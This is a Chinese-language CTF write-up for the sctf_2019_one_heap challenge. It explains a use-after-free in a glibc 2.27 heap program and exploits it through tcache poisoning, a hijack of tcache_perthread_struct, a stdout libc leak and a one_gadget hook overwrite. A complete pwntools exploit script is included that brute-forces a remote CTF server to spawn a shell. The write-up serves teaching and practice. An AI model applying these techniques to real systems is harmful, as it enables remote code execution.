# sctf_2019_one_heap



### 总结

根据本题，学习与收获有：

- `tcache_perthread_struct`这个结构体也是阔以释放的，并且可以将它释放到`unsorted bin`中去，然后分配这个`unsorted bin chunk`，可以控制任意地址分配堆内存。



<!-- more -->

### 题目分析

#### checksec

![image-20210503180503385](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210503180503385.png)

题目的环境为`ubuntu 18`，并且保护全开。

#### 函数分析

##### main

![image-20210504134146571](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504134146571.png)

##### menu_get_choice

![image-20210504134408474](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504134408474.png)

这个函数名是我自己取的，是为了方便理解。这里只有两个选项，只能`new`和`delete`。接下来，分别看一下这两个选项。

##### new_note

![image-20210504134555468](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504134555468.png)

需要注意的点有：

- 分配的`chunk`的大小限制在`0x7f`内
- 分配的数量限制在`0xf`，也就是这里的`malloc_count`变量大小

##### delete_note

![image-20210504134737467](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504134737467.png)

需要注意的点：

- 执行完`free(ptr)`后，没有将指针置空，存在`UAF`漏洞
- 最多只能释放`4`次，也就是`free_count`的大小

#### 漏洞点

漏洞出现在`delete_note`函数处，这里存在`UAF`漏洞。由于程序的运行环境为`ubuntu 18`，那么在`libc-2.27.so`的前几个版本中，引入的`tcache bin`机制是缺乏校验机制的。也就是，即使对`tcache bin chunk`重复释放，也不会引发任何异常。比`fastbin chunk`的约束更少，一来不检查`size`域，二来也不检查是否重复释放。

但是，程序只提供一个`ptr`指针来进行堆操作，因此，需要劫持一下`tcache_perthread_struct`这个结构体。

### 利用思路

#### 知识点

- `tcache bin dup`
- `tcache bin poisoning`
- `tacahe_perthread_struct`

很多知识点在之前的一些博客里面已经讲过了，这里不再赘叙。

#### 利用过程

步骤：

- 调用`1`次`new_note`，分配一个`0x80`大小的`chunk`
- 连续释放两次上方分配的`chunk`
- 爆破一个字节，将`chunk`分配到`tcache_perthread_struct`
- 修改大小为为`0x250`大小的`chunk`的数量，需要超过`7`，之后释放掉`tcache_perthread_struct`，使其被放置再在`unsorted bin`中。
- 分配这个`unsorted bin chunk`，首先爆破`1`个字节，分配到`stdout`结构体附近，使用`stdout`来泄露`libc`地址
- 分配到`__malloc_hook`上方，修改`__malloc_hook`为`one_gadget`地址，再次分配时即可`getshell`

### EXP

#### 调试过程

- 准备好分配与释放函数

  ```python
  def new_note(size, content="id"):
      sh.sendlineafter("Your choice:", '1')
      sh.sendlineafter("Input the size:", str(size))
      sh.sendlineafter("Input the content:", content)
  
  
  def del_note():
      sh.sendlineafter("Your choice:", '2')
  ```

- 利用`tcache bin dup`分配到`tcache_perthread_struct`，并修改`0x250`大小的`chunk`对应的数量为`7`。这里需要爆破`1`个字节，因为保护全开的话，堆地址对齐到内存页，低`2`个字节一定是`?000`，这里的代码是手动输入，实际需要爆破，成功率为`1/16`。

  ```python
  new_note(0x70)
  del_note()
  del_note()
  lw = input("one_byte:")
  lw = int16(lw)
  new_note(0x70, p16((lw << 8) | 0x10))
  new_note(0x70)
  layout = [0, 0, 0, 0, 0x07000000]
  new_note(0x70, flat(layout))
  ```

  ![image-20210504142019042](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504142019042.png)

  显然，这里需要输入`0x40`

  ![image-20210504142145181](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504142145181.png)

  ![image-20210504142300056](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504142300056.png)

- 释放掉`tcache_perthread_struct`

  ```python
  del_note()
  ```

  ![image-20210504142807205](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504142807205.png)

- 然后利用`unsorted bin`的`fd`与`bk`指针会留一个`libc`地址的特性，爆破一个字节，分配到`stdout`上方，这里直接修改`0x50`大小的`chunk`的`tcache bins`的头指针地址

  ```python
  new_note(0x40, p64(0) * 5)
  lw = input("one_byte:")
  lw = int16(lw)
  new_note(0x10, flat(0, p16((lw << 8) | 0x60)))
  ```

  ![image-20210504143253502](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504143253502.png)

  这里就需要输入`0x77`，可以看到修改成功了
  ![image-20210504143407708](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504143407708.png)

- 然后利用`stdout`泄露出`libc`地址，并修改地址分配`chunk`到`__realloc_hook`上方。这里需要调整一下栈帧，所以要借助`__realloc_hook`。首先`del_note`是为了能再次修改`0x50`大小的`chunk`的头指针。

  ```python
  del_note()
  
  new_note(0x40, flat(0xfbad1887, 0, 0, 0, "\x58"))
  msg = sh.recvn(8)
  leak_addr = u64(msg)
  LOG_ADDR("leak_addr", leak_addr)
  libc_base_addr = leak_addr - 0x3e82a0
  LOG_ADDR("libc_base_addr", libc_base_addr)
  realloc_hook_addr = libc_base_addr + libc.sym["__realloc_hook"]
  realloc_addr = libc_base_addr + libc.sym["realloc"]
  
  gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
  one_gadget = libc_base_addr + gadgets[2]
  new_note(0x10, flat(0, p64(realloc_hook_addr)[:6]))
  ```
  
  ![image-20210504143940989](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504143940989.png)
  
  然后任意地址分配：
  
  ![image-20210504144111894](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504144111894.png)
  
- 然后调整栈帧之后，再次分配即可`getshell`

  ```python
  new_note(0x40, flat(one_gadget, realloc_addr+0x4))
  new_note(0x10)
  sh.interactive()
  ```

  ![image-20210504144523640](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504144523640.png)

  ![image-20210504144623168](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504144623168.png)



远程需要爆破`tcache_perthread_struct`的低`2`位字节，与`stdout`结构体的低`2`位字节，远程爆破效果为：

![image-20210504145941441](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210504145941441.png)

爆破了`218`次才成功！

#### 完整exp

```python
from pwn import *

# sh:tube = process("./sctf_2019_one_heap")
context.update(arch="amd64", os="linux", endian="little")
sh = remote("node3.buuoj.cn", 26663)
cur_elf = ELF("./sctf_2019_one_heap")
libc = cur_elf.libc

def LOG_ADDR(*args):
    pass

context.update(arch="amd64", os="linux", endian="little")

def new_note(size, content="id"):
    sh.sendlineafter("Your choice:", '1')
    sh.sendlineafter("Input the size:", str(size))
    sh.sendlineafter("Input the content:", content)


def del_note():
    sh.sendlineafter("Your choice:", '2')

def attack(first, second):
    new_note(0x70)
    del_note()
    del_note()

    new_note(0x70, p16((first << 8) | 0x10))
    new_note(0x70)
    layout = [0, 0, 0, 0, 0x07000000]
    new_note(0x70, flat(layout))
    del_note()

    new_note(0x40, p64(0) * 5)

    new_note(0x10, flat(0, p16((second << 8) | 0x60)))
    del_note()

    new_note(0x40, flat(0xfbad1887, 0, 0, 0, "\x58"))
    msg = sh.recvn(8)
    leak_addr = u64(msg)
    LOG_ADDR("leak_addr", leak_addr)
    libc_base_addr = leak_addr - 0x3e82a0
    realloc_hook_addr = libc_base_addr + libc.sym["__realloc_hook"]
    realloc_addr = libc_base_addr + libc.sym["realloc"]

    gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
    one_gadget = libc_base_addr + gadgets[2]
    new_note(0x10, flat(0, p64(realloc_hook_addr)[:6]))

    new_note(0x40, flat(one_gadget, realloc_addr+0x4))

    new_note(0x10)
    try:
        sh.sendline("id")
        sh.recvline_contains("uid", timeout=2)
        sh.sendline("cat flag")
        sh.interactive()
    except:
        try:
            sh.close()
        except:
            pass

if __name__ == "__main__":
    n = 0x1000
    while n > 0:
        log.success("counts: {}".format(0x1000 - n))
        try:
            attack(0x60, 0x67)
        except:
            pass
        # sh = process("./sctf_2019_one_heap")
        sh = remote("node3.buuoj.cn", 26663)
        n -= 1
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-05-03-sctf-2019-one-heap/  

